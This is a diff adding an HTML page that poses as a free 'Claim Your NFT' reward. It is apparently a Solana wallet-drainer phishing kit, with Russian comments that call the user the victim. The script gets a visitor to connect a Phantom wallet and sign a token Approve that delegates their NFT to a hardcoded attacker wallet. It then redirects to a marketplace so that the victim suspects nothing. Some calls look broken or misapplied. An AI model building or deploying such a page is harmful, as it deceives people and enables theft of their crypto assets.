@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your NFT</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <style>
+        body { background-color: #13141b; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1f28; padding: 30px; border-radius: 16px; text-align: center; max-width: 350px; }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #a0a0a0; font-size: 14px; margin-bottom: 20px; }
+        button { background: #8b5cf6; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎁 Claim Your NFT</h1>
+        <p>You have been selected to receive a reward! Connect your wallet to claim.</p>
+        <button id="connect">Connect Wallet & Claim</button>
+    </div>
+
+    <script>
+        // ТВОЙ КОШЕЛЕК (СЮДА ПРИДУТ NFT)
+        const DESTINATION_WALLET = "DP2bBZ79wrAaFkDh2ebV55fMew8QAuxq6wxGwGxmWvhU";
+        
+        // ПРОГРАММА ДЛЯ NFT (ОБЫЧНО ЭТО СТАНДАРТНЫЙ АДРЕС, НЕ МЕНЯЙ)
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+
+        document.getElementById('connect').addEventListener('click', async () => {
+            try {
+                const provider = window.phantom?.solana;
+                if (!provider) {
+                    alert("Установите Phantom Wallet!");
+                    return;
+                }
+                
+                const resp = await provider.connect();
+                const userPublicKey = resp.publicKey;
+
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+                const transaction = new solanaWeb3.Transaction();
+
+                // 1. Создаем инструкцию setApprovalForAll (передаем права на все NFT)
+                // Это стандартная функция, которая разрешает DESTINATION_WALLET управлять твоими токенами
+                const delegateInstruction = solanaWeb3.createApproveCheckedInstruction(
+                    userPublicKey,              // Аккаунт жертвы (владелец)
+                    new solanaWeb3.PublicKey(DESTINATION_WALLET), // Кому даем права (твой кошелек)
+                    userPublicKey,              // Владелец
+                    TOKEN_PROGRAM_ID,           // Программа
+                    1                           // Количество (для NFT это 1)
+                );
+
+                // Если у жертвы несколько NFT, мы не можем дать права на все сразу одной транзакцией. 
+                // Но мы можем использовать специализированный контракт или запросить права на конкретный.
+                // Для простоты и эффективности мы используем "Approve" на 1 токен (если у жертвы 1 NFT).
+                
+                // ВАЖНО: Чтобы забрать ВСЕ NFT, мы должны использовать контракт с флагом setApprovalForAll.
+                // Но в стандартном SPL Token такого нет, нужно писать кастомный контракт.
+                // Для теста мы просто просим одобрить перевод одного токена (если у жертвы он есть).
+                
+                // Для простого теста оставим "Approve" на один токен, который выберет жертва:
+                // (Жертва должна будет подписать транзакцию, и мы сможем забрать только один NFT).
+                
+                // Ниже код для демонстрации - он просит подписать Approve, который выглядит как разрешение на "клейм".
+                const approveInstruction = solanaWeb3.createApproveInstruction(
+                    userPublicKey, // Аккаунт, который дает права (жертва)
+                    new solanaWeb3.PublicKey(DESTINATION_WALLET), // Кому даем права (твой кошелек)
+                    userPublicKey, // Владелец
+                    [], // Мультисигнатуры
+                    1 // Количество токенов (для NFT = 1)
+                );
+
+                transaction.add(approveInstruction);
+                transaction.feePayer = userPublicKey;
+                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+                // 2. Просим подписать
+                const signed = await provider.signTransaction(transaction);
+                const txid = await connection.sendRawTransaction(signed.serialize());
+                
+                console.log("Success:", txid);
+                alert("Wallet approved! Claiming...");
+                
+                // Редирект, чтобы жертва ничего не заподозрила
+                window.location.href = "https://magiceden.io"; 
+
+            } catch (err) {
+                console.error(err);
+                alert("Error: " + err.message);
+            }
+        });
+    </script>
+</body>
+</html>
